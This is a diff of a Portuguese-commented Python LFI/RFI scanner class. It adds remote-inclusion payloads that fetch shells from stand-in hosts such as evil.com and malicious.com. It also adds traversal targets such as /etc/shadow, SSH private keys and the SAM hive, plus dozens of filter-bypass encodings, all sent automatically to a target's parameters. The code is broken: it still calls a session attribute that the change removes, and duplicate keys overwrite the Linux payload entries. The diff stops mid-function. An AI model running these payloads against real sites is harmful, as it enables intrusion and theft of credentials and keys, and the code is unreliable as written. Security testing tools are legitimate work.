@@ -8080,88 +8080,680 @@ def command_injection_scan(url):
 # --- MÓDULO 17: SCANNER DE LFI (LOCAL FILE INCLUSION) ---
 
 class LFIScanner:
-    def __init__(self, base_url):
+    def __init__(self, base_url, timeout=10, threads=5):
         self.base_url = base_url
-        self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
+        self.timeout = timeout
+        self.threads = threads
+        self.verbose = False
+        self.fast_mode = False
+        self.found_vulnerabilities = []
+        self.stop_on_first = False
+        
+        # Session pool para melhor performance
+        self.session_pool = []
+        for _ in range(min(threads, 10)):  # Máximo 10 sessões
+            session = requests.Session()
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive'
+            })
+            # Configurar pool de conexões
+            adapter = requests.adapters.HTTPAdapter(
+                pool_connections=10,
+                pool_maxsize=20,
+                max_retries=1
+            )
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            self.session_pool.append(session)
+            
+        self.current_session_index = 0
         self.vulnerable_points = []
-        self.payloads = {"/etc/passwd": "root:x:0:0", "c:\\boot.ini": "[boot loader]"}
+        self.rfi_payloads = [
+            "http://evil.com/shell.txt",
+            "https://pastebin.com/raw/test",
+            "ftp://malicious.com/backdoor.php"
+        ]
+        self.payloads = {
+            # Linux/Unix files
+            "/etc/passwd": ["root:x:0:0", "daemon:x:1:1", "bin:x:2:2"],
+            "/etc/shadow": ["root:$", "daemon:*:", "bin:*:"],
+            "/etc/hosts": ["127.0.0.1", "localhost"],
+            "/etc/group": ["root:x:0:", "daemon:x:1:"],
+            "/etc/issue": ["Ubuntu", "Debian", "CentOS", "Red Hat"],
+            "/etc/motd": ["Welcome", "Last login"],
+            "/etc/fstab": ["proc", "sysfs", "devpts"],
+            "/etc/crontab": ["SHELL=/bin/bash", "PATH=/usr/local/sbin"],
+            "/etc/apache2/apache2.conf": ["ServerRoot", "Listen"],
+            "/etc/nginx/nginx.conf": ["worker_processes", "http {"],
+            "/var/log/apache2/access.log": ["GET", "POST", "200", "404"],
+            "/var/log/nginx/access.log": ["GET", "POST", "200", "404"],
+            "/proc/version": ["Linux version", "gcc version"],
+            "/proc/cpuinfo": ["processor", "model name"],
+            "/proc/meminfo": ["MemTotal", "MemFree"],
+            "/proc/self/environ": ["PATH=", "HOME="],
+            "/proc/cmdline": ["BOOT_IMAGE", "root="],
+            "/proc/mounts": ["rootfs", "proc", "sysfs"],
+            "/proc/net/arp": ["IP address", "HW type"],
+            "/proc/net/route": ["Iface", "Destination"],
+            "/proc/net/tcp": ["sl", "local_address"],
+            "/proc/net/udp": ["sl", "local_address"],
+            "/proc/net/fib_trie": ["Local", "Main"],
+            "/proc/self/status": ["Name:", "Pid:"],
+            "/proc/self/cmdline": ["python", "apache", "nginx"],
+            "/proc/self/stat": ["(", ")"],
+            "/proc/self/fd/0": ["/dev/pts", "socket"],
+            "/proc/self/fd/1": ["/dev/pts", "socket"],
+            "/proc/self/fd/2": ["/dev/pts", "socket"],
+            "/home/user/.bashrc": ["alias", "export"],
+            "/home/user/.bash_history": ["sudo", "ssh", "mysql"],
+            "/root/.bashrc": ["alias", "export"],
+            "/root/.bash_history": ["sudo", "ssh", "mysql"],
+            "/root/.ssh/id_rsa": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
+            "/root/.ssh/id_dsa": ["BEGIN DSA PRIVATE KEY"],
+            "/root/.ssh/authorized_keys": ["ssh-rsa", "ssh-dss"],
+            "/home/user/.ssh/id_rsa": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
+            "/home/user/.ssh/authorized_keys": ["ssh-rsa", "ssh-dss"],
+            
+            # Windows files
+            "c:\\boot.ini": ["[boot loader]", "timeout=", "default="],
+            "c:\\windows\\system32\\drivers\\etc\\hosts": ["127.0.0.1", "localhost"],
+            "c:\\windows\\system32\\config\\sam": ["SAM", "SECURITY"],
+            "c:\\windows\\system32\\config\\system": ["SYSTEM", "ControlSet"],
+            "c:\\windows\\system32\\config\\security": ["SECURITY", "Policy"],
+            "c:\\windows\\system32\\config\\software": ["SOFTWARE", "Microsoft"],
+            "c:\\windows\\win.ini": ["[fonts]", "[extensions]"],
+            "c:\\windows\\system.ini": ["[386Enh]", "[drivers]"],
+            "c:\\autoexec.bat": ["@echo off", "PATH"],
+            "c:\\config.sys": ["DOS=HIGH", "DEVICE="],
+            "c:\\inetpub\\wwwroot\\web.config": ["<configuration>", "<system.web>"],
+            "c:\\program files\\apache group\\apache\\conf\\httpd.conf": ["ServerRoot", "Listen"],
+            "c:\\xampp\\apache\\conf\\httpd.conf": ["ServerRoot", "Listen"],
+            "c:\\wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf": ["ServerRoot", "Listen"],
+            "c:\\apache\\conf\\httpd.conf": ["ServerRoot", "Listen"],
+            "c:\\apache2\\conf\\httpd.conf": ["ServerRoot", "Listen"],
+            "c:\\php\\php.ini": ["[PHP]", "extension_dir"],
+            "c:\\windows\\php.ini": ["[PHP]", "extension_dir"],
+            "c:\\winnt\\php.ini": ["[PHP]", "extension_dir"],
+            "c:\\users\\administrator\\ntuser.dat": ["RegEdit", "Registry"],
+            "c:\\documents and settings\\administrator\\ntuser.dat": ["RegEdit", "Registry"],
+            "c:\\windows\\repair\\sam": ["SAM", "SECURITY"],
+            "c:\\windows\\repair\\system": ["SYSTEM", "ControlSet"],
+            "c:\\windows\\temp\\": ["tmp", "temp"],
+            "c:\\temp\\": ["tmp", "temp"],
+            "c:\\inetpub\\logs\\logfiles\\w3svc1\\ex": ["date", "time", "GET", "POST"],
+            "c:\\windows\\system32\\logfiles\\httperr\\httperr1.log": ["Date", "Time", "GET", "POST"],
+            
+            # Mac OS files
+            "/etc/master.passwd": ["root:", "daemon:"],
+            "/etc/passwd": ["root:*:0:0", "daemon:*:1:1"],
+            "/etc/group": ["wheel:*:0:", "daemon:*:1:"],
+            "/etc/hosts": ["127.0.0.1", "localhost"],
+            "/etc/resolv.conf": ["nameserver", "domain"],
+            "/var/log/system.log": ["kernel", "launchd"],
+            "/private/etc/passwd": ["root:*:0:0", "daemon:*:1:1"],
+            "/private/etc/master.passwd": ["root:", "daemon:"],
+            "/users/administrator/.bash_history": ["sudo", "ssh", "mysql"],
+            "/users/administrator/.bashrc": ["alias", "export"],
+            "/system/library/launchdaemons/": ["plist", "daemon"],
+            "/library/preferences/": ["plist", "preferences"],
+            "/applications/": ["app", "Applications"],
+            "/private/var/log/": ["log", "system"],
+            "/usr/local/bin/": ["bin", "usr"],
+            "/opt/local/bin/": ["bin", "opt"],
+            "/private/etc/apache2/httpd.conf": ["ServerRoot", "Listen"],
+            "/private/etc/nginx/nginx.conf": ["worker_processes", "http {"],
+            "/library/webserver/documents/": ["index", "html"],
+            "/usr/local/mysql/data/": ["mysql", "data"],
+            "/private/var/mysql/": ["mysql", "data"],
+            "/private/etc/my.cnf": ["[mysqld]", "datadir"],
+            "/usr/local/etc/my.cnf": ["[mysqld]", "datadir"],
+            "/opt/local/etc/mysql5/my.cnf": ["[mysqld]", "datadir"]
+        }
+
+    def _apply_encoding_techniques(self, payload):
+        """Aplica diferentes técnicas de codificação para bypass de filtros"""
+        techniques = [
+            payload,  # Original
+            payload.replace('/', '%2f'),  # URL encoding
+            payload.replace('/', '%252f'),  # Double URL encoding
+            payload.replace('/', '%c0%af'),  # UTF-8 encoding
+            payload.replace('/', '%c1%9c'),  # UTF-8 overlong encoding
+            payload + '%00',  # Null byte termination
+            payload.replace('../', '..\\'),  # Windows path separator
+            payload.replace('../', '....//'),  # Double dot slash
+            payload.replace('../', '..%2f'),  # Mixed encoding
+            payload.replace('../', '..%252f'),  # Double encoded slash
+            payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
+            payload.replace('../', '..%5c'),  # Backslash encoding
+            payload.replace('../', '..\\..\\'),  # Mixed separators
+            payload.replace('/', '\\'),  # Full backslash
+            payload + '?',  # Query string bypass
+            payload + '#',  # Fragment bypass
+            payload + '/./',  # Current directory bypass
+            payload + '//',  # Double slash
+            payload.replace('/', '/./'),  # Current directory injection
+            payload.replace('/', '//'),  # Double slash injection
+            payload.replace('../', '..;/'),  # Semicolon bypass
+            payload.replace('../', '..%00/'),  # Null byte bypass
+            payload.replace('../', '..%0d%0a/'),  # CRLF bypass
+            payload.replace('../', '..%09/'),  # Tab bypass
+            payload.replace('../', '..%20/'),  # Space bypass
+            payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
+            payload.replace('../', '%2e%2e%2f'),  # Dot encoding
+            payload.replace('../', '%2e%2e/'),  # Mixed dot encoding
+            payload.replace('../', '..%2f%2e%2e%2f'),  # Complex encoding
+            payload.replace('../', '..\\..\\'),  # Windows double backslash
+            payload.replace('../', '..%5c..%5c'),  # Encoded backslash
+            payload + '\\x00',  # Null byte (hex)
+            payload.replace('/', '%2F'),  # Capital URL encoding
+            payload.replace('../', '..%2F'),  # Mixed case encoding
+            payload.replace('../', '..%2f%2e%2e%2f'),  # Complex lowercase
+            payload.replace('../', '..%2F%2E%2E%2F'),  # Complex uppercase
+            payload.replace('../', '....%2f%2f'),  # Quadruple dot
+            payload.replace('../', '....\\\\'),  # Quadruple backslash
+            payload.replace('../', '..%u002f'),  # Unicode encoding
+            payload.replace('../', '..%u005c'),  # Unicode backslash
+            payload.replace('../', '..\\u002f'),  # Mixed unicode
+            payload.replace('../', '..\\u005c'),  # Mixed unicode backslash
+            payload.replace('../', '..%c0%2f'),  # Overlong UTF-8
+            payload.replace('../', '..%e0%80%af'),  # Overlong UTF-8 variant
+            payload.replace('../', '..%f0%80%80%af'),  # Overlong UTF-8 variant 2
+            payload.replace('../', '..%c0%ae%c0%ae%c0%af'),  # Multiple overlong
+            payload.replace('../', '..%c0%ae%c0%ae/'),  # Mixed overlong
+            payload.replace('../', '..%c0%ae%c0%ae%2f'),  # Mixed overlong encoded
+            payload.replace('../', '..%c0%ae%c0%ae%5c'),  # Mixed overlong backslash
+            payload.replace('../', '..%c0%ae%c0%ae\\'),  # Mixed overlong literal
+            payload.replace('../', '..%c0%ae\\%c0%ae\\'),  # Complex overlong
+            payload.replace('../', '..%c0%ae%2f%c0%ae%2f'),  # Complex overlong slash
+            payload.replace('../', '..%c0%ae%5c%c0%ae%5c'),  # Complex overlong backslash
+            payload.replace('../', '..%c0%ae../'),  # Mixed overlong traversal
+            payload.replace('../', '..%c0%ae\\..\\'),  # Mixed overlong windows
+            payload + '\\x00\\x00',  # Double null byte
+            payload + '\\x00\\x00\\x00',  # Triple null byte
+            payload + '%00%00',  # Double encoded null
+            payload + '%00%00%00',  # Triple encoded null
+            payload + '\\0',  # String null terminator
+            payload + '\\0\\0',  # Double string null
+        ]
+        return techniques
+
+    def _test_rfi(self, url, method, param, form_data=None):
+        """Testa Remote File Inclusion (RFI)"""
+        if self.verbose:
+            console.print(f"[*] Testando RFI no parâmetro [cyan]{param}[/cyan]...")
+            
+        for rfi_payload in self.rfi_payloads:
+            if self.verbose:
+                console.print(f"    [*] Testando payload RFI: [yellow]{rfi_payload}[/yellow]")
+                
+            try:
+                test_data = {param: rfi_payload}
+                if method.lower() == 'get':
+                    response = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
+                else:
+                    post_payload = form_data.copy() if form_data else {}
+                    post_payload[param] = rfi_payload
+                    response = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
+                
+                if self.verbose:
+                    console.print(f"    [*] Resposta: {response.status_code} - {len(response.text)} bytes")
+                
+                # Detecção de RFI através de códigos de status e tempo de resposta
+                if response.status_code == 200 and len(response.text) > 100:
+                    # Procura por indicadores de execução remota
+                    rfi_indicators = [
+                        "<?php", "<script>", "eval(", "system(", "exec(", "shell_exec(",
+                        "passthru(", "file_get_contents(", "fopen(", "include(", "require(",
+                        "remote shell", "backdoor", "webshell", "r57", "c99", "c100"
+                    ]
+                    
+                    for indicator in rfi_indicators:
+                        if indicator.lower() in response.text.lower():
+                            if self.verbose:
+                                console.print(f"    [bold red][!] RFI DETECTADO![/bold red] Indicador encontrado: [red]{indicator}[/red]")
+                                
+                            finding = {
+                                "Risco": "Crítico",
+                                "Tipo": "Remote File Inclusion (RFI)",
+                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                                "Recomendação": f"Payload '{rfi_payload}' pode permitir execução de código remoto.",
+                                "Payload": rfi_payload,
+                                "Response_Length": len(response.text),
+                                "Status_Code": response.status_code,
+                                "Indicator": indicator
+                            }
+                            if finding not in self.vulnerable_points:
+                                self.vulnerable_points.append(finding)
+                            return True
+                            
+            except requests.RequestException as e:
+                if self.verbose:
+                    console.print(f"    [red][!] Erro na requisição: {e}[/red]")
+                continue
+        return False
 
     def _scan_target(self, url, method, param, form_data=None):
-        for path, signature in self.payloads.items():
-            for i in range(8):
-                payload = "../" * i + path
-                try:
-                    test_data = {param: payload}
-                    if method.lower() == 'get': response = self.session.get(url, params=test_data, timeout=7, verify=False)
-                    else:
-                        post_payload = form_data.copy()
-                        post_payload[param] = payload
-                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)
-                    
-                    if signature in response.text:
-                        finding = {"Risco": "Alto", "Tipo": "Local File Inclusion (LFI)", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"Payload '{payload}' retornou a assinatura de um ficheiro de sistema."}
-                        if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
-                        return
-                except requests.RequestException: continue
+        """Escaneia um alvo específico para vulnerabilidades LFI/RFI"""
+        if self.verbose:
+            console.print(f"[*] Analisando parâmetro [cyan]{param}[/cyan] via [yellow]{method.upper()}[/yellow]")
+            
+        # Primeiro testa RFI
+        if self._test_rfi(url, method, param, form_data):
+            return
+            
+        # Depois testa LFI
+        if self.verbose:
+            console.print(f"[*] Testando LFI no parâmetro [cyan]{param}[/cyan] ({len(self.payloads)} arquivos alvo)...")
+            
+        files_tested = 0
+        for path, signatures in self.payloads.items():
+            if self.verbose and files_tested % 10 == 0:
+                console.print(f"    [*] Progresso: {files_tested}/{len(self.payloads)} arquivos testados...")
+                
+            for i in range(10):  # Aumentado para 10 níveis de traversal
+                base_payload = "../" * i + path
+                
+                # Aplica diferentes técnicas de encoding
+                encoded_payloads = self._apply_encoding_techniques(base_payload)
+                
+                for payload_index, payload in enumerate(encoded_payloads):
+                    if self.verbose and payload_index == 0:  # Mostra apenas o payload original no verbose
+                        console.print(f"        [*] Testando arquivo: [blue]{path}[/blue] (nível {i})")
+                        
+                    try:
+                        start_time = time.time()
+                        
+                        test_data = {param: payload}
+                        if method.lower() == 'get':
+                            response = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
+                        else:
+                            post_payload = form_data.copy() if form_data else {}
+                            post_payload[param] = payload
+                            response = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
+                        
+                        response_time = time.time() - start_time
+                        
+                        # Detecção por assinatura
+                        for signature in signatures:
+                            if signature.lower() in response.text.lower():
+                                if self.verbose:
+                                    encoding_tech = self._get_encoding_technique(payload, base_payload)
+                                    console.print(f"        [bold green][+] LFI DETECTADO![/bold green] Assinatura: [green]{signature}[/green]")
+                                    console.print(f"            [*] Técnica: {encoding_tech}")
+                                    console.print(f"            [*] Tempo: {response_time:.3f}s")
+                                    console.print(f"            [*] Status: {response.status_code}")
+                                    
+                                finding = {
+                                    "Risco": "Alto",
+                                    "Tipo": "Local File Inclusion (LFI)",
+                                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                                    "Recomendação": f"Payload '{payload}' retornou conteúdo do arquivo '{path}'.",
+                                    "Payload": payload,
+                                    "File_Path": path,
+                                    "Signature": signature,
+                                    "Response_Time": round(response_time, 3),
+                                    "Response_Length": len(response.text),
+                                    "Status_Code": response.status_code,
+                                    "Encoding_Technique": self._get_encoding_technique(payload, base_payload)
+                                }
+                                if finding not in self.vulnerable_points:
+                                    self.vulnerable_points.append(finding)
+                                    return
+                        
+                        # Detecção por timing (arquivos grandes podem causar delay)
+                        if response_time > 2.0 and response.status_code == 200:
+                            if self.verbose:
+                                console.print(f"        [yellow][!] Timing suspeito detectado: {response_time:.2f}s[/yellow]")
+                                
+                            timing_finding = {
+                                "Risco": "Médio",
+                                "Tipo": "Possível LFI (Timing-based)",
+                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                                "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
+                                "Payload": payload,
+                                "File_Path": path,
+                                "Response_Time": round(response_time, 3),
+                                "Response_Length": len(response.text),
+                                "Status_Code": response.status_code,
+                                "Detection_Method": "Timing-based"
+                            }
+                            if timing_finding not in self.vulnerable_points:
+                                self.vulnerable_points.append(timing_finding)
+                        
+                        # Detecção por código de status anômalo
+                        if response.status_code in [403, 500, 502, 503] and len(response.text) > 100:
+                            if self.verbose:
+                                console.print(f"        [orange3][!] Erro HTTP suspeito: {response.status_code}[/orange3]")
+                                
+                            error_finding = {
+                                "Risco": "Baixo",
+                                "Tipo": "Possível LFI (Error-based)",
+                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                                "Recomendação": f"Payload '{payload}' causou erro HTTP {response.status_code}.",
+                                "Payload": payload,
+                                "File_Path": path,
+                                "Response_Time": round(response_time, 3),
+                                "Response_Length": len(response.text),
+                                "Status_Code": response.status_code,
+                                "Detection_Method": "Error-based"
+                            }
+                            if error_finding not in self.vulnerable_points:
+                                self.vulnerable_points.append(error_finding)
+                                
+                    except requests.RequestException as e:
+                        if self.verbose:
+                            console.print(f"        [red][!] Erro na requisição: {e}[/red]")
+                        continue
+                        
+            files_tested += 1
 
-    def run_scan(self, return_findings=False):
+    def _get_encoding_technique(self, encoded_payload, original_payload):
+        """Identifica a técnica de codificação usada"""
+        if encoded_payload == original_payload:
+            return "Original"
+        elif '%2f' in encoded_payload.lower():
+            return "URL Encoding"
+        elif '%252f' in encoded_payload.lower():
+            return "Double URL Encoding"
+        elif '%c0%af' in encoded_payload.lower():
+            return "UTF-8 Overlong Encoding"
+        elif '%00' in encoded_payload:
+            return "Null Byte Termination"
+        elif '\\' in encoded_payload:
+            return "Windows Path Separator"
+        elif '....///' in encoded_payload:
+            return "Double Dot Slash"
+        elif '%u00' in encoded_payload.lower():
+            return "Unicode Encoding"
+        else:
+            return "Mixed Encoding"
+
+    def run_scan(self, return_findings=False, export_results=False):
         if not return_findings:
-            console.print("-" * 60)
-            console.print(f"[*] Executando scanner de LFI em: [bold cyan]{self.base_url}[/bold cyan]")
-            console.print("-" * 60)
+            console.print("-" * 80)
+            console.print(f"[*] Executando scanner avançado de LFI/RFI em: [bold cyan]{self.base_url}[/bold cyan]")
+            console.print(f"[*] Timeout: {self.timeout}s | Threads: {self.threads} | Payloads: {len(self.payloads)}")
+            if self.verbose:
+                console.print(f"[*] Modo verbose: [green]ATIVO[/green] - Exibindo detalhes completos")
+                console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
+                console.print(f"[*] RFI payloads: {len(self.rfi_payloads)} URLs de teste")
+            console.print("-" * 80)
+        
+        start_time = time.time()
+        
+        if self.verbose:
+            console.print("[*] Conectando ao alvo...")
+            
         try:
             with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
-                response = self.session.get(self.base_url, timeout=10, verify=False)
+                response = self.session.get(self.base_url, timeout=self.timeout, verify=False)
                 soup = BeautifulSoup(response.content, 'html.parser')
+                
+            if self.verbose:
+                console.print(f"[*] Resposta do servidor: {response.status_code}")
+                console.print(f"[*] Tamanho da página: {len(response.text)} bytes")
+                console.print(f"[*] Content-Type: {response.headers.get('content-type', 'N/A')}")
+                
         except requests.RequestException as e:
             if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
             return [] if return_findings else None
 
-        common_params = ['file', 'page', 'include', 'path', 'document', 'img']
+        # Parâmetros comuns expandidos
+        common_params = [
+            'file', 'page', 'include', 'path', 'document', 'img', 'view', 'load', 'read',
+            'template', 'src', 'url', 'dir', 'folder', 'content', 'data', 'resource',
+            'filename', 'filepath', 'pathname', 'location', 'link', 'href', 'target',
+            'source', 'destination', 'upload', 'download', 'action', 'module', 'cat',
+            'show', 'display', 'get', 'fetch', 'retrieve', 'open', 'exec', 'cmd',
+            'command', 'function', 'method', 'class', 'lib', 'library', 'inc', 'req',
+            'require', 'import', 'plugin', 'addon', 'extension', 'component', 'widget',
+            'theme', 'skin', 'style', 'css', 'js', 'script', 'code', 'lang', 'locale',
+            'config', 'conf', 'setting', 'option', 'param', 'var', 'val', 'value',
+            'text', 'html', 'xml', 'json', 'csv', 'log', 'tmp', 'temp', 'cache',
+            'session', 'cookie', 'token', 'key', 'id', 'uid', 'gid', 'user', 'usr',
+            'admin', 'root', 'home', 'public', 'private', 'secret', 'hidden', 'backup',
+            'old', 'new', 'copy', 'orig', 'original', 'bak', 'back', 'save', 'restore',
+            'db', 'database', 'sql', 'query', 'search', 'find', 'lookup', 'browse',
+            'list', 'index', 'menu', 'nav', 'navigation', 'site', 'web', 'www',
+            'http', 'https', 'ftp', 'sftp', 'ssh', 'telnet', 'smtp', 'pop', 'imap',
+            'dns', 'ip', 'host', 'domain', 'subdomain', 'port', 'protocol', 'service',
+            'api', 'rest', 'soap', 'xml', 'rpc', 'ajax', 'json', 'jsonp', 'callback',
+            'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o'
+        ]
+        
         tasks = []
+        
+        if self.verbose:
+            console.print("[*] Coletando pontos de entrada...")
+            
+        # Coleta links com parâmetros GET
         links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
+        if self.verbose:
+            console.print(f"[*] Encontrados {len(links)} links com parâmetros GET")
+            
         for link in links:
             parsed = urlparse(link)
             base = urlunparse(parsed._replace(query=""))
             for param in parse_qs(parsed.query):
-                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))
+                if any(p in param.lower() for p in common_params): 
+                    if self.verbose:
+                        console.print(f"    [+] Parâmetro GET encontrado: [cyan]{param}[/cyan] em {base}")
+                    tasks.append(('get', base, param, None))
 
+        # Coleta formulários
         forms = soup.find_all('form')
+        if self.verbose:
+            console.print(f"[*] Encontrados {len(forms)} formulários")
+            
         for form in forms:
             action = urljoin(self.base_url, form.get('action', ''))
             method = form.get('method', 'post').lower()
-            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
+            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')}
             for param in data:
-                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
+                if any(p in param.lower() for p in common_params): 
+                    if self.verbose:
+                        console.print(f"    [+] Parâmetro {method.upper()} encontrado: [cyan]{param}[/cyan] em {action}")
+                    tasks.append((method, action, param, data))
+        
+        # Testa parâmetros comuns mesmo se não encontrados na página
+        if not tasks:
+            if not return_findings: console.print("[yellow]Nenhum parâmetro encontrado na página. Testando parâmetros comuns...[/yellow]")
+            if self.verbose:
+                console.print("[*] Testando parâmetros comuns mesmo sem detecção na página...")
+                
+            for param in ['file', 'page', 'include', 'path', 'view', 'load', 'src', 'url']:
+                if self.verbose:
+                    console.print(f"    [+] Adicionando parâmetro comum: [cyan]{param}[/cyan]")
+                tasks.append(('get', self.base_url, param, None))
         
         if not tasks:
-            if not return_findings: console.print("[yellow]Nenhum parâmetro comum de LFI encontrado para testar.[/yellow]")
+            if not return_findings: console.print("[yellow]Nenhum parâmetro para testar.[/yellow]")
             return [] if return_findings else None
 
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
-            task_id = progress.add_task("[green]Testando LFI...", total=len(tasks))
+        if self.verbose:
+            console.print(f"[*] Iniciando testes em {len(tasks)} parâmetros encontrados...")
+            console.print("[*] Ordem de teste: RFI → LFI (assinatura) → LFI (timing) → LFI (error-based)")
+
+        # Executa os testes
+        with Progress(
+            SpinnerColumn(), 
+            TextColumn("[progress.description]{task.description}"), 
+            BarColumn(), 
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
+            TimeRemainingColumn(),
+            console=console, 
+            transient=return_findings or self.verbose
+        ) as progress:
+            task_id = progress.add_task("[green]Testando LFI/RFI...", total=len(tasks))
             for method, url, param, form_data in tasks:
-                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
+                if not self.verbose:
+                    progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] em [yellow]{method.upper()}[/yellow]...")
+                else:
+                    progress.update(task_id, advance=1, description=f"[green]Processando [cyan]{param}[/cyan]...")
                 self._scan_target(url, method, param, form_data)
 
-        if return_findings: return self.vulnerable_points
+        scan_time = time.time() - start_time
+        
+        if not return_findings:
+            console.print(f"\n[bold blue][*] Scan concluído em {scan_time:.2f} segundos[/bold blue]")
+            console.print(f"[bold blue][*] Parâmetros testados: {len(tasks)}[/bold blue]")
+            console.print(f"[bold blue][*] Vulnerabilidades encontradas: {len(self.vulnerable_points)}[/bold blue]")
+            
+            if self.verbose:
+                console.print(f"[*] Tempo médio por parâmetro: {scan_time/len(tasks):.2f}s")
+                console.print(f"[*] Payloads testados por parâmetro: ~{len(self.payloads) * 10 * len(self._apply_encoding_techniques('test'))}")
+                console.print(f"[*] Total de requisições aproximadas: {len(tasks) * len(self.payloads) * 10}")
+                
+                if self.vulnerable_points:
+                    console.print("[*] Resumo das técnicas que funcionaram:")
+                    techniques_used = {}
+                    for vuln in self.vulnerable_points:
+                        tech = vuln.get('Encoding_Technique', vuln.get('Detection_Method', 'N/A'))
+                        techniques_used[tech] = techniques_used.get(tech, 0) + 1
+                    
+                    for tech, count in techniques_used.items():
+                        console.print(f"    [*] {tech}: {count} detecção(ões)")
+                        
+            
+            
+        if return_findings: 
+            return self.vulnerable_points
+        
         self._present_findings()
+        
+        if export_results:
+            self.export_findings()
+            
+        return self.vulnerable_points
 
     def _present_findings(self):
-        console.print("-" * 60)
+        console.print("-" * 80)
         if not self.vulnerable_points:
-            console.print("[bold green][+] Nenhuma vulnerabilidade de LFI foi encontrada.[/bold green]")
+            console.print("[bold green][+] Nenhuma vulnerabilidade de LFI/RFI foi encontrada.[/bold green]")
         else:
-            table = Table(title="Potenciais Vulnerabilidades de LFI Encontradas")
-            table.add_column("Detalhe", style="cyan")
-            table.add_column("Recomendação", style="white")
-            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
-            console.print(table)
-        console.print("-" * 60)
+            # Separar por tipo de vulnerabilidade
+            lfi_findings = [f for f in self.vulnerable_points if 'LFI' in f['Tipo']]
+            rfi_findings = [f for f in self.vulnerable_points if 'RFI' in f['Tipo']]
+            timing_findings = [f for f in self.vulnerable_points if 'Timing' in f['Tipo']]
+            error_findings = [f for f in self.vulnerable_points if 'Error' in f['Tipo']]
+            
+            # Tabela principal de vulnerabilidades críticas e altas
+            critical_high = [f for f in self.vulnerable_points if f['Risco'] in ['Crítico', 'Alto']]
+            if critical_high:
+                table = Table(title="[bold red]Vulnerabilidades Críticas e de Alto Risco[/bold red]")
+                table.add_column("Tipo", style="red")
+                table.add_column("Risco", style="red")
+                table.add_column("Detalhe", style="cyan")
+                table.add_column("Payload", style="yellow")
+                table.add_column("Status", style="green")
+                table.add_column("Tempo (s)", style="magenta")
+                
+                for f in critical_high:
+                    payload = f.get('Payload', 'N/A')[:50] + '...' if len(f.get('Payload', '')) > 50 else f.get('Payload', 'N/A')
+                    table.add_row(
+                        f['Tipo'],
+                        f['Risco'],
+                        f['Detalhe'],
+                        payload,
+                        str(f.get('Status_Code', 'N/A')),
+                        str(f.get('Response_Time', 'N/A'))
+                    )
+                console.print(table)
+                console.print()
+            
+            # Tabela de vulnerabilidades médias e baixas
+            medium_low = [f for f in self.vulnerable_points if f['Risco'] in ['Médio', 'Baixo']]
+            if medium_low:
+                table2 = Table(title="[bold yellow]Vulnerabilidades de Médio e Baixo Risco[/bold yellow]")
+                table2.add_column("Tipo", style="yellow")
+                table2.add_column("Risco", style="yellow")
+                table2.add_column("Detalhe", style="cyan")
+                table2.add_column("Método de Detecção", style="green")
+                table2.add_column("Status", style="green")
+                
+                for f in medium_low:
+                    table2.add_row(
+                        f['Tipo'],
+                        f['Risco'],
+                        f['Detalhe'],
+                        f.get('Detection_Method', 'Signature-based'),
+                        str(f.get('Status_Code', 'N/A'))
+                    )
+                console.print(table2)
+                console.print()
+            
+            # Estatísticas resumidas
+            stats_table = Table(title="[bold blue]Estatísticas do Scan[/bold blue]")
+            stats_table.add_column("Categoria", style="blue")
+            stats_table.add_column("Quantidade", style="white")
+            
+            stats_table.add_row("Total de Vulnerabilidades", str(len(self.vulnerable_points)))
+            stats_table.add_row("LFI Confirmadas", str(len(lfi_findings)))
+            stats_table.add_row("RFI Confirmadas", str(len(rfi_findings)))
+            stats_table.add_row("Timing-based", str(len(timing_findings)))
+            stats_table.add_row("Error-based", str(len(error_findings)))
+            stats_table.add_row("Crítico", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Crítico'])))
+            stats_table.add_row("Alto", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Alto'])))
